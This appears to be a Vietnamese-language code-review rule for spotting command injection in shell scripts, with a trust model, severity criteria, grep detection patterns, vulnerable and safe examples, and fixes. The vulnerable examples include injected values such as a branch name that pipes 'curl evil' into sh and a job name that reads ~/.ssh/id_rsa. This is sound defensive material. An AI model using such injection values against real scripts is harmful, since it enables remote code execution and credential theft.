---
id: COMMAND-INJECTION
severity_max: CRITICAL
applies_to: shell
---

# Command Injection (Shell)

## Intent

Shell KHÔNG có ranh giới data/code — **mọi expansion đều là code tiềm năng**. Khác Rust/Python (phải cố tình gọi `sh -c` mới dính), trong shell script thì mặc định đã ở trong shell: `eval`, command substitution, và word splitting biến data thành lệnh ngay. Vibe code shell hay dính 3 dạng đặc trưng:

1. **`eval` / `sh -c` với biến** — kinh điển.
2. **Splice biến vào SOURCE của interpreter khác qua heredoc** — `python3 <<EOF` / `osascript -e` / `awk "..."` với `$VAR` nội suy thẳng vào string literal của ngôn ngữ kia. Một dấu `'` trong data là thoát literal, phần còn lại chạy thành code Python/JXA/awk. Dạng này LLM hay skim qua vì "trông như config".
3. **Remote expansion** — `ssh host "cmd $var"`: `$var` expand lần 2 trên shell remote.

## Trust model của shell script (quan trọng — quyết định severity)

Shell script đa số là tooling owner-run local → input thường L3/L4 → **downgrade có kỷ luật, không bỏ flag**. Nhưng phải trace đúng nguồn:

- **L1 thật sự trong shell:** biến CI từ PR/branch/commit-message (`$BRANCH_NAME` từ `github.head_ref`, commit msg của contributor), filename từ thư mục upload/watch (`for f in incoming/*`), nội dung file fetch từ network, webhook payload.
- **L3:** CLI arg owner gõ tay, JSON config tracked trong repo.
- **L4:** env var owner set, constant.

CRITICAL khi sink nhận L1. Owner-run + L3/L4 → MEDIUM (robustness: 1 dấu `'` trong content hợp lệ vẫn vỡ script), KHÔNG im lặng bỏ qua — content tự nhiên (copy text, tên bài hát) chứa apostrophe là chuyện thường ngày.

## Khi nào CRITICAL

- `eval "$VAR"` / `eval "cmd $VAR"` với VAR có gốc L1
- `sh -c "... $VAR ..."`, `bash -c`, `zsh -c` với L1
- Heredoc KHÔNG quote delimiter (`<<EOF`, không phải `<<'EOF'`) đưa `$VAR` vào source `python3`/`node -e`/`osascript`/`ruby -e`/`awk`
- `ssh $host "cmd $VAR"` — double expansion remote
- `bash <(curl ...)` / `curl | sh` với URL động (xem thêm rule 20)
- Ghi `$VAR` vào rc file (`>> ~/.zshrc`) — persistence sink

## Khi nào downgrade (HIGH/MEDIUM)

- Input là L3/L4 (owner chạy tay, config tracked trong repo), không có đường remote → MEDIUM
- Có validate whitelist (`[[ "$x" =~ ^[a-z0-9-]+$ ]]`) TRƯỚC khi vào sink → HIGH nếu regex còn hở, PASS nếu chặt
- Script chỉ chạy trong CI do owner kiểm soát toàn bộ input → HIGH

## Cách reasoning (KHÔNG pattern-match thuần)

1. **Grep** theo Search patterns dưới.
2. **Read** trọn script — shell script ngắn, ĐỌC HẾT, đừng skim theo hotspot. Đặc biệt nhìn heredoc block: delimiter có quote không (`<<'EOF'` safe, `<<EOF` expand)?
3. **Trace** biến về nguồn: arg (`$1`), env, `$(jq ...)` từ file nào, CI context nào.
4. **Verify**: data đi qua env var/argv (safe) hay nội suy vào string source (nguy hiểm)?

## Search patterns (shell-specific)

```
\beval\s+"?\$
\b(ba|z)?sh\s+-c\s+["']
<<-?\s*EOF\b                    # heredoc KHÔNG quote → expansion bật; soi $VAR bên trong
(python3?|node|ruby|osascript|awk|sed)\s+(-e\s+)?"[^"]*\$
json\.loads\('\$|'\$\{?[A-Z_]+  # biến shell nằm trong single-quote literal của lang khác
ssh\s+\S+\s+".*\$
(\$HOME|~)/\.(zshrc|bashrc|bash_profile|zprofile)
`.*\$.*`
```

## Examples

### CRITICAL — flag

```bash
# CI: branch name là L1 (attacker đặt tên branch trong PR)
BRANCH="$1"  # từ github.head_ref
sh -c "git checkout $BRANCH && ./deploy.sh"   # branch ";curl evil|sh;" → RCE
```

```bash
# Heredoc splice — biến nằm TRONG string literal Python
python3 <<EOF
import json
clip = [c for c in clips if c['id'] == '$CLIP_ID']   # 1 dấu ' trong CLIP_ID → thoát literal
data = json.loads('$PAYLOAD')                          # PAYLOAD chứa ' → chạy code Python
EOF
```

```bash
# ssh double expansion — JOB từ queue file do user khác ghi
ssh worker01 "rm -rf /tmp/jobs/$JOB && ./run.sh $JOB"  # JOB='x; cat ~/.ssh/id_rsa' chạy trên remote
```

### NOT critical — safe

```bash
# Quoted delimiter + env var: data đi qua environ, không vào source
CLIP_ID="$1" python3 <<'EOF'
import json, os
clip_id = os.environ["CLIP_ID"]   # an toàn dù chứa ' hay ;
EOF
```

```bash
# Whitelist chặt trước sink + argv list (không qua eval/sh -c)
[[ "$ACTION" =~ ^(start|stop|restart)$ ]] || exit 1
systemctl "$ACTION" myservice
```

## Fix recommendation

1. **Truyền data qua env var hoặc argv**, đừng nội suy vào source: `VAR="$x" python3 <<'EOF'` + `os.environ`, hoặc `python3 script.py "$x"` + `sys.argv`.
2. **Quote heredoc delimiter** (`<<'EOF'`) khi block là source code của interpreter khác.
3. **Không `eval`** — gần như luôn có cách khác (array + `"${cmd[@]}"`, `printf %q` nếu bắt buộc build string).
4. **JSON thì dùng `jq`** để trích/ghép, đừng splice string vào `json.loads('...')`.
5. **ssh**: `ssh host 'cmd "$1"' _ "$var"` hoặc truyền qua stdin; đừng ghép string lệnh remote.

## Cross-references

- Rule `10-path-traversal`: unquoted expansion thành flag/path — argument injection cùng họ
- Rule `20-outdated-dependency`: `curl | sh` không pin/checksum
- Rule `22-prompt-injection`: hook shell inject text external vào prompt agent
